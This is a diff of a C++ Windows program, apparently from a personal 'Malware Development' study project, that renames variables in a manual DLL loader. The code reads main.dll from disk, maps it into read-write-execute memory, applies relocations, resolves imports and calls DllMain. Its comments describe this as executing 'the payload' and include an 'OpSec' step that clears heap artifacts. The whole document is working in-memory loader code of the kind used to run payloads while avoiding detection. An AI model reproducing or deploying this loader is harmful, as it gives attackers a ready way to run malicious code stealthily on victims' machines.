@@ -8,297 +8,298 @@ typedef BOOL(WINAPI *DLLEntry)(HINSTANCE, DWORD, LPVOID);
 
 int main(int argc, char *argv[]) {
 
-  //////////////////////////////////////////////////////////////////////////////
-  // Disk Staging & Buffer Ingestion
-  /////////////////////////////////////////////////////////////////////////////
+  ////////////////////////////////////////////////////////////////////////////
+  // 1. Disk staging & buffer ingestion
+  ////////////////////////////////////////////////////////////////////////////
 
   // Creates or opens a file or I/O device.
   // obsidian://open?vault=vault-obsidian-backup&file=10-Malware%20%20Development%2F01%20-%20Windows%20Research%2F02%20-%20Windows%2F05%20-%20C%2B%2B%2F02%20-%20Windows%2FWin32%2FAPI%2FCreateFileA
-  HANDLE hFildLL = CreateFileA("main.dll", GENERIC_READ, FILE_SHARE_READ, NULL,
+  HANDLE h_file = CreateFileA("main.dll", GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
 
   LoggInfo("Creates file h_andler");
-  LoggAddress("hFildLL", (void *)hFildLL);
-  LoggHex32("hFildLL", (DWORD)(uintptr_t)hFildLL);
+  LoggAddress("h_file", (void *)h_file);
+  LoggHex32("h_file", (DWORD)(uintptr_t)h_file);
 
-  if (hFildLL == INVALID_HANDLE_VALUE) {
+  if (h_file == INVALID_HANDLE_VALUE) {
     LoggAddress("INVALID_HANDLE_VALUE", (void *)INVALID_HANDLE_VALUE);
     return 1;
   }
-  //////////////////////////////////
-  // Retrieves the size of the specified file.
+  ////////////////////////////////////////////////////////////////////////////
+  // 2. Read file size
+  ////////////////////////////////////////////////////////////////////////////
   // obsidian://open?vault=vault-obsidian-backup&file=10-Malware%20%20Development%2F01%20-%20Windows%20Research%2F02%20-%20Windows%2F05%20-%20C%2B%2B%2F02%20-%20Windows%2FWin32%2FAPI%2FGetFileSizeEx
   // obsidian://open?vault=vault-obsidian-backup&file=10-Malware%20%20Development%2F01%20-%20Windows%20Research%2F02%20-%20Windows%2F05%20-%20C%2B%2B%2F02%20-%20Windows%2FWin32%2FAPI%2FCloseHandle
-  LARGE_INTEGER liFileSize;
-  if (!GetFileSizeEx(hFildLL, &liFileSize)) {
-    CloseHandle(hFildLL);
+  LARGE_INTEGER file_size;
+  if (!GetFileSizeEx(h_file, &file_size)) {
+    CloseHandle(h_file);
     LoggError("GetFileSizeEx failed");
     return 1;
   }
-  DWORD dwFileSize = static_cast<DWORD>(liFileSize.QuadPart);
+  DWORD cb_file_size = static_cast<DWORD>(file_size.QuadPart);
   LoggInfo("Retrieves the size of the specified file.");
-  LoggHex64("liFileSize.QuadPart", liFileSize.QuadPart);
-  LoggHex32("dwFileSize", dwFileSize);
+  LoggHex64("file_size.QuadPart", file_size.QuadPart);
+  LoggHex32("cb_file_size", cb_file_size);
 
-  /////////////////////////////////
-  // Allocates a block of memory from a heap. The allocated memory is not
-  // movable. << HeapAlloc Retrieves a handle to the default heap of the calling
-  // process << GetProcessHeap
+  ////////////////////////////////////////////////////////////////////////////
+  // 3. Allocate raw staging buffer
+  ////////////////////////////////////////////////////////////////////////////
   // obsidian://open?vault=vault-obsidian-backup&file=10-Malware%20%20Development%2F01%20-%20Windows%20Research%2F02%20-%20Windows%2F05%20-%20C%2B%2B%2F02%20-%20Windows%2FWin32%2FAPI%2FHeapAlloc
   // obsidian://open?vault=vault-obsidian-backup&file=10-Malware%20%20Development%2F01%20-%20Windows%20Research%2F02%20-%20Windows%2F05%20-%20C%2B%2B%2F02%20-%20Windows%2FWin32%2FAPI%2FGetProcessHeap
-  PBYTE pRawBuffer = static_cast<PBYTE>(
-      HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize));
+  PBYTE p_raw_buffer = static_cast<PBYTE>(
+      HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb_file_size));
 
   LoggInfo("Allocates a block of memory from a heap");
-  LoggAddress("pRawBuffer", pRawBuffer);
-  LoggHex32("dwFileSize", dwFileSize);
-  if (!pRawBuffer) {
-    CloseHandle(hFildLL);
+  LoggAddress("p_raw_buffer", p_raw_buffer);
+  LoggHex32("cb_file_size", cb_file_size);
+  if (!p_raw_buffer) {
+    CloseHandle(h_file);
     return 1;
   }
-  /////////////////////////////////
-  // Reads data from the specified file or input/output (I/O) device. <<
-  // ReadFile Frees a memory block allocated from a heap << HeapFree
+  ////////////////////////////////////////////////////////////////////////////
+  // 4. Read file contents into memory
+  ////////////////////////////////////////////////////////////////////////////
   // obsidian://open?vault=vault-obsidian-backup&file=10-Malware%20%20Development%2F01%20-%20Windows%20Research%2F02%20-%20Windows%2F05%20-%20C%2B%2B%2F02%20-%20Windows%2FWin32%2FAPI%2FReadFile
   // obsidian://open?vault=vault-obsidian-backup&file=10-Malware%20%20Development%2F01%20-%20Windows%20Research%2F02%20-%20Windows%2F05%20-%20C%2B%2B%2F02%20-%20Windows%2FWin32%2FAPI%2FHeapFree
-  DWORD dwBytesRead = 0;
+  DWORD cb_bytes_read = 0;
 
   LoggInfo("Reads data ");
-  LoggHex32("dwBytesRead", dwBytesRead);
+  LoggHex32("cb_bytes_read", cb_bytes_read);
 
-  if (!ReadFile(hFildLL, pRawBuffer, dwFileSize, &dwBytesRead, NULL)) {
-    HeapFree(GetProcessHeap(), 0, pRawBuffer);
-    CloseHandle(hFildLL);
+  if (!ReadFile(h_file, p_raw_buffer, cb_file_size, &cb_bytes_read, NULL)) {
+    HeapFree(GetProcessHeap(), 0, p_raw_buffer);
+    CloseHandle(h_file);
     return 1;
   }
-  CloseHandle(hFildLL);
-  hFildLL = INVALID_HANDLE_VALUE;
+  CloseHandle(h_file);
+  h_file = INVALID_HANDLE_VALUE;
 
-  //////////////////////////////////////////////////////////////////////////////
-  //  PE Header Parsing and Structural Validation
-  /////////////////////////////////////////////////////////////////////////////
-  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pRawBuffer;
+  ////////////////////////////////////////////////////////////////////////////
+  // 5. Parse PE headers and validate structure
+  ////////////////////////////////////////////////////////////////////////////
+  PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)p_raw_buffer;
   LoggInfo("PE Header Parsing and Structural Validation");
-  LoggAddress("pDosHeader", pDosHeader);
-  LoggHex16("e_magic", pDosHeader->e_magic);
-  LoggHex32("e_lfanew", pDosHeader->e_lfanew);
+  LoggAddress("p_dos_header", p_dos_header);
+  LoggHex16("e_magic", p_dos_header->e_magic);
+  LoggHex32("e_lfanew", p_dos_header->e_lfanew);
 
-  if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+  if (p_dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
     LoggError("Invalid DOS signature Error");
-    HeapFree(GetProcessHeap(), 0, pRawBuffer);
+    HeapFree(GetProcessHeap(), 0, p_raw_buffer);
     return 1;
   }
 
-  if (pDosHeader->e_lfanew < sizeof(IMAGE_DOS_HEADER) ||
-      pDosHeader->e_lfanew >
-          static_cast<LONG>(dwFileSize - sizeof(IMAGE_NT_HEADERS))) {
+  if (p_dos_header->e_lfanew < sizeof(IMAGE_DOS_HEADER) ||
+      p_dos_header->e_lfanew >
+          static_cast<LONG>(cb_file_size - sizeof(IMAGE_NT_HEADERS))) {
     LoggError("Invalid e_lfanew");
-    HeapFree(GetProcessHeap(), 0, pRawBuffer);
+    HeapFree(GetProcessHeap(), 0, p_raw_buffer);
     return 1;
   }
 
-  //////////////////////////////////////////////////////////////////////////////
-  // Parsing NT
-  // structures to find the size of the DLL file, which is stored in the
-  // nt_headers->OptionalHeader.SizeOfImage member variable. > //55
-  /////////////////////////////////////////////////////////////////////////////
+  ////////////////////////////////////////////////////////////////////////////
+  // 6. Resolve NT headers and image size
+  ////////////////////////////////////////////////////////////////////////////
 
-  PIMAGE_NT_HEADERS pNtHeaders =
-      (PIMAGE_NT_HEADERS)(pRawBuffer + pDosHeader->e_lfanew);
+  PIMAGE_NT_HEADERS p_nt_headers =
+      (PIMAGE_NT_HEADERS)(p_raw_buffer + p_dos_header->e_lfanew);
   LoggInfo("Parsing NT NT_HEADERS");
-  LoggAddress("pNtHeaders", pNtHeaders);
-  LoggHex32("PE Signature", pNtHeaders->Signature);
-  LoggHex32("ImageBase", (DWORD)pNtHeaders->OptionalHeader.ImageBase);
-  LoggHex32("SizeOfImage", pNtHeaders->OptionalHeader.SizeOfImage);
+  LoggAddress("p_nt_headers", p_nt_headers);
+  LoggHex32("PE Signature", p_nt_headers->Signature);
+  LoggHex32("ImageBase", (DWORD)p_nt_headers->OptionalHeader.ImageBase);
+  LoggHex32("SizeOfImage", p_nt_headers->OptionalHeader.SizeOfImage);
   LoggHex32("AddressOfEntryPoint",
-            pNtHeaders->OptionalHeader.AddressOfEntryPoint);
-  if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
-    HeapFree(GetProcessHeap(), 0, pRawBuffer);
+            p_nt_headers->OptionalHeader.AddressOfEntryPoint);
+  if (p_nt_headers->Signature != IMAGE_NT_SIGNATURE) {
+    HeapFree(GetProcessHeap(), 0, p_raw_buffer);
     return 1;
   }
-  ////////////////////////////////////////////////
-  //  Virtual Allocation & Section Mapping
-  //
-  DWORD dwImageSize = pNtHeaders->OptionalHeader.SizeOfImage;
+  ////////////////////////////////////////////////////////////////////////////
+  // 7. Allocate image memory and map sections
+  ////////////////////////////////////////////////////////////////////////////
+  DWORD cb_image_size = p_nt_headers->OptionalHeader.SizeOfImage;
   ///////////////////////////////////////////////
   // 55 nt_headers->OptionalHeader.SizeOfImage
-  PBYTE pImageBase = (PBYTE)VirtualAlloc(
-      (LPVOID)pNtHeaders->OptionalHeader.ImageBase, dwImageSize,
+  PBYTE p_image_base = (PBYTE)VirtualAlloc(
+      (LPVOID)p_nt_headers->OptionalHeader.ImageBase, cb_image_size,
       MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   LoggInfo(" Virtual Allocation & Section Mapping");
-  LoggAddress("allocated", pImageBase);
-  if (!pImageBase) {
-    pImageBase = (PBYTE)VirtualAlloc(
-        NULL, dwImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  LoggAddress("allocated", p_image_base);
+  if (!p_image_base) {
+    p_image_base = (PBYTE)VirtualAlloc(
+        NULL, cb_image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   }
 
-  if (!pImageBase) {
+  if (!p_image_base) {
     LoggError("VirtualAlloc failed");
-    HeapFree(GetProcessHeap(), 0, pRawBuffer);
+    HeapFree(GetProcessHeap(), 0, p_raw_buffer);
     return 1;
   }
-  ////////////////////////////////////
-  // delta reloc
-  ULONG_PTR uDeltaBase =
-      (ULONG_PTR)pImageBase - pNtHeaders->OptionalHeader.ImageBase;
+  ////////////////////////////////////////////////////////////////////////////
+  // 8. Apply base reloc_dir
+  ////////////////////////////////////////////////////////////////////////////
+  ULONG_PTR delta_base =
+      (ULONG_PTR)p_image_base - p_nt_headers->OptionalHeader.ImageBase;
   LoggInfo(" 7 Delat Reloc");
-  LoggDelta("LoggDelta", uDeltaBase);
+  LoggDelta("LoggDelta", delta_base);
 
-  ////////////////////////////////////
-  // memcpy headers
-  memcpy(pImageBase, pRawBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders);
+  ////////////////////////////////////////////////////////////////////////////
+  // 9. Copy PE headers
+  ////////////////////////////////////////////////////////////////////////////
+  memcpy(p_image_base, p_raw_buffer, p_nt_headers->OptionalHeader.SizeOfHeaders);
   LoggInfo("8 Cpoy headers");
-  ////////////////////////////////////
-  // Mapp sect
-  PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
+  ////////////////////////////////////////////////////////////////////////////
+  // 10. Map section data
+  ////////////////////////////////////////////////////////////////////////////
+  PIMAGE_SECTION_HEADER p_section = IMAGE_FIRST_SECTION(p_nt_headers);
   LoggInfo("9 Mappage des sections");
-  for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
-    PVOID pSectionDest = pImageBase + pSection->VirtualAddress;
-    PVOID pSectionSrc = pRawBuffer + pSection->PointerToRawData;
+  for (WORD index = 0; index < p_nt_headers->FileHeader.NumberOfSections; index++) {
+    PVOID pSectionDest = p_image_base + p_section->VirtualAddress;
+    PVOID pSectionSrc = p_raw_buffer + p_section->PointerToRawData;
 
-    if (pSection->SizeOfRawData > 0) {
-      memcpy(pSectionDest, pSectionSrc, pSection->SizeOfRawData);
+    if (p_section->SizeOfRawData > 0) {
+      memcpy(pSectionDest, pSectionSrc, p_section->SizeOfRawData);
     }
-    pSection++;
-    LoggAddress("pSection", pSection);
-    // LoggHex16("pSection", (WORD)(uintptr_t)pSection);
-    // LoggHex32("pSection", (DWORD)(uintptr_t)pSection);
+    p_section++;
+    LoggAddress("p_section", p_section);
+    // LoggHex16("p_section", (WORD)(uintptr_t)p_section);
+    // LoggHex32("p_section", (DWORD)(uintptr_t)p_section);
   }
 
-  //////////////////////////////////////////////////////////////////////////////
-  // Relocations
-  /////////////////////////////////////////////////////////////////////////////
+  ////////////////////////////////////////////////////////////////////////////
+  // 11. Process reloc_dir
+  ////////////////////////////////////////////////////////////////////////////
 
   ///////////////////////////////////////////////
   // Delta calculation for ASLR/Rebase fixups
-  IMAGE_DATA_DIRECTORY relocations =
-      pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+  IMAGE_DATA_DIRECTORY reloc_dir =
+      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
   LoggInfo("Relocations");
-  if (relocations.VirtualAddress != 0 && relocations.Size > 0) {
-    DWORD_PTR relocationTable =
-        (DWORD_PTR)pImageBase + relocations.VirtualAddress;
-    DWORD relocationsProcessed = 0;
+  if (reloc_dir.VirtualAddress != 0 && reloc_dir.Size > 0) {
+    DWORD_PTR relocation_table =
+        (DWORD_PTR)p_image_base + reloc_dir.VirtualAddress;
+    DWORD cb_relocations_processed = 0;
     ////////////////////////////////////////////
     // Traverse the raw relocation table byte by byte
-    while (relocationsProcessed < relocations.Size) {
-      PBASE_RELOCATION_BLOCK relocationBlock =
-          (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
-      relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
+    while (cb_relocations_processed < reloc_dir.Size) {
+      PBASE_RELOCATION_BLOCK p_relocation_block =
+          (PBASE_RELOCATION_BLOCK)(relocation_table + cb_relocations_processed);
+      cb_relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
 
-      if (relocationBlock->BlockSize == 0)
+      if (p_relocation_block->BlockSize == 0)
         break;
       ////////////////////////////////////////////
       // Dynamically calculate the number of entries in the current block
-      DWORD relocationsCount =
-          (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) /
+      DWORD cb_relocations_count =
+          (p_relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) /
           sizeof(BASE_RELOCATION_ENTRY);
 
-      PBASE_RELOCATION_ENTRY relocationEntries =
-          (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
+      PBASE_RELOCATION_ENTRY p_relocation_entries =
+          (PBASE_RELOCATION_ENTRY)(relocation_table + cb_relocations_processed);
 
-      for (DWORD i = 0; i < relocationsCount; i++) {
-        relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
+      for (DWORD index = 0; index < cb_relocations_count; index++) {
+        cb_relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
         // IMAGE_REL_BASED_ABSOLUTE (Type 0) is used for padding alignment
-        if (relocationEntries[i].Type == 0) {
+        if (p_relocation_entries[index].Type == 0) {
           continue;
         }
 
-        DWORD_PTR relocationRVA =
-            relocationBlock->PageAddress + relocationEntries[i].Offset;
+        DWORD_PTR rva_relocation =
+            p_relocation_block->PageAddress + p_relocation_entries[index].Offset;
         /////////////////////////////////////////
         // Security/Boundary check to prevent OOB writes on malformed PEs
 
-        if (relocationRVA > dwImageSize - sizeof(DWORD_PTR)) {
+        if (rva_relocation > cb_image_size - sizeof(DWORD_PTR)) {
           continue;
         }
         ////////////////////////////////////////
         // Resolve the absolute memory address and apply the ASLR Delta
-        DWORD_PTR *pPatchAddress =
-            (DWORD_PTR *)((DWORD_PTR)pImageBase + relocationRVA);
-        *pPatchAddress += uDeltaBase;
+        DWORD_PTR *p_patch_address =
+            (DWORD_PTR *)((DWORD_PTR)p_image_base + rva_relocation);
+        *p_patch_address += delta_base;
       }
     }
-    LoggAddress("relocationTable", (PVOID)relocationTable);
-    LoggHex32("relocations.Size", relocations.Size);
+    LoggAddress("relocation_table", (PVOID)relocation_table);
+    LoggHex32("reloc_dir.Size", reloc_dir.Size);
   }
 
-  //////////////////////////////////////////////////////////////////////////////
-  // Imports
-  /////////////////////////////////////////////////////////////////////////////
-  IMAGE_DATA_DIRECTORY importsDirectory =
-      pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+  ////////////////////////////////////////////////////////////////////////////
+  // 12. Resolve imports
+  ////////////////////////////////////////////////////////////////////////////
+  IMAGE_DATA_DIRECTORY import_directory =
+      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
   LoggInfo("11 Inports");
-  if (importsDirectory.VirtualAddress != 0) {
-    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor =
-        (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)pImageBase +
-                                   importsDirectory.VirtualAddress);
+  if (import_directory.VirtualAddress != 0) {
+    PIMAGE_IMPORT_DESCRIPTOR p_import_descriptor =
+        (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)p_image_base +
+                                   import_directory.VirtualAddress);
 
     // Extract DLL name from RVA
-    while (pImportDescriptor->Name != 0) {
-      PCHAR pLibraryName =
-          (PCHAR)((DWORD_PTR)pImageBase + pImportDescriptor->Name);
+    while (p_import_descriptor->Name != 0) {
+      PCHAR p_library_name =
+          (PCHAR)((DWORD_PTR)p_image_base + p_import_descriptor->Name);
       LoggInfo("--- DLL ---");
-      LoggInfo(pLibraryName);
-      LoggAddress("pLibraryName", pLibraryName);
-      LoggHex32("pImportDescriptor->Name", (DWORD)pImportDescriptor->Name);
+      LoggInfo(p_library_name);
+      LoggAddress("p_library_name", p_library_name);
+      LoggHex32("p_import_descriptor->Name", (DWORD)p_import_descriptor->Name);
       // Load the dependency into memory
-      HMODULE hLibrary = LoadLibraryA(pLibraryName);
-      if (hLibrary == NULL) {
+      HMODULE h_library = LoadLibraryA(p_library_name);
+      if (h_library == NULL) {
         LoggError("Failed to load DLL");
         break;
       }
       ///////////////////////////////////////////
       // Setup IAT (FirstThunk) and INT (OriginalFirstThunk) pointers
       //////////////////////////////////////////
-      PIMAGE_THUNK_DATA thunk =
-          (PIMAGE_THUNK_DATA)((DWORD_PTR)pImageBase +
-                              pImportDescriptor->FirstThunk);
+      PIMAGE_THUNK_DATA p_thunk =
+          (PIMAGE_THUNK_DATA)((DWORD_PTR)p_image_base +
+                              p_import_descriptor->FirstThunk);
       // LoggInfo("AT (Import Address Table)");
 
       //////////////////////////////////////////
       // INT (Import Name Table) - noms/ordinaux des fonctions
-      PIMAGE_THUNK_DATA originalThunk =
-          (PIMAGE_THUNK_DATA)((DWORD_PTR)pImageBase +
-                              pImportDescriptor->OriginalFirstThunk);
+      PIMAGE_THUNK_DATA p_original_thunk =
+          (PIMAGE_THUNK_DATA)((DWORD_PTR)p_image_base +
+                              p_import_descriptor->OriginalFirstThunk);
       // LoggInfo("INT Import Name Table");
 
-      LoggAddress("pImportDescriptor", pImportDescriptor);
+      LoggAddress("p_import_descriptor", p_import_descriptor);
       LoggInfo("-------------------");
       // Si OriginalFirstThunk est 0, on utilise FirstThunk (certains linkers)
-      if (!originalThunk) {
-        originalThunk = thunk;
+      if (!p_original_thunk) {
+        p_original_thunk = p_thunk;
       }
 
-      while (thunk->u1.AddressOfData != 0) {
-        DWORD_PTR functionAddress = 0;
+      while (p_thunk->u1.AddressOfData != 0) {
+        DWORD_PTR fn_address = 0;
 
-        if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
+        if (IMAGE_SNAP_BY_ORDINAL(p_original_thunk->u1.Ordinal)) {
           // Resolve by Ordinal (Highest bit of u1.Ordinal is set to 1)
-          LPCSTR functionOrdinal =
-              (LPCSTR)IMAGE_ORDINAL(originalThunk->u1.Ordinal);
-          functionAddress =
-              (DWORD_PTR)GetProcAddress(hLibrary, functionOrdinal);
+          LPCSTR p_function_ordinal =
+              (LPCSTR)IMAGE_ORDINAL(p_original_thunk->u1.Ordinal);
+          fn_address =
+              (DWORD_PTR)GetProcAddress(h_library, p_function_ordinal);
         } else {
           // Resolve by Name
-          PIMAGE_IMPORT_BY_NAME functionName =
-              (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pImageBase +
-                                      originalThunk->u1.AddressOfData);
+          PIMAGE_IMPORT_BY_NAME p_function_name =
+              (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)p_image_base +
+                                      p_original_thunk->u1.AddressOfData);
 
-          functionAddress =
-              (DWORD_PTR)GetProcAddress(hLibrary, functionName->Name);
+          fn_address =
+              (DWORD_PTR)GetProcAddress(h_library, p_function_name->Name);
           LoggInfo("Resolving function:");
-          LoggAddress(" functionName", functionName);
-          LoggInfo((char *)functionName->Name);
+          LoggAddress(" p_function_name", p_function_name);
+          LoggInfo((char *)p_function_name->Name);
           LoggInfo("-------------------");
         }
         // Overwrite the IAT entry with the resolved absolute address
-        thunk->u1.Function = functionAddress;
+        p_thunk->u1.Function = fn_address;
 
-        thunk++;
-        originalThunk++;
+        p_thunk++;
+        p_original_thunk++;
       }
 
-      pImportDescriptor++;
+      p_import_descriptor++;
     }
   }
 
@@ -310,25 +311,25 @@ int main(int argc, char *argv[]) {
   typedef BOOL(APIENTRY * pfnDllMain)(HINSTANCE hinstDLL, DWORD fdwReason,
                                       LPVOID lpvReserved);
   // Resolve the absolute address of the Entry Point
-  pfnDllMain pDllMain =
-      (pfnDllMain)(pImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
+  pfnDllMain p_dll_main =
+      (pfnDllMain)(p_image_base + p_nt_headers->OptionalHeader.AddressOfEntryPoint);
 
   // OpSec: Free the raw downloaded/read buffer to remove heap artifacts
-  LoggAddress("pDllMain", reinterpret_cast<void *>(pDllMain));
+  LoggAddress("p_dll_main", reinterpret_cast<void *>(p_dll_main));
   // Libération du buffer brut
-  HeapFree(GetProcessHeap(), 0, pRawBuffer);
-  pRawBuffer = NULL;
+  HeapFree(GetProcessHeap(), 0, p_raw_buffer);
+  p_raw_buffer = NULL;
 
   // Execute the payload
-  if (pDllMain != NULL) {
+  if (p_dll_main != NULL) {
    // Simulate Windows Loader behavior for DLLs
-    BOOL bSuccess = pDllMain((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
+    BOOL b_success = p_dll_main((HINSTANCE)p_image_base, DLL_PROCESS_ATTACH, NULL);
     LoggInfo("Call DllMain");
 
     // Adhere to PE specification: if DllMain fails, cleanup memory
-    if (!bSuccess) {
+    if (!b_success) {
       LoggError("DllMain returned FALSE");
-      VirtualFree(pImageBase, 0, MEM_RELEASE);
+      VirtualFree(p_image_base, 0, MEM_RELEASE);
       return 1;
     }
     return 0;
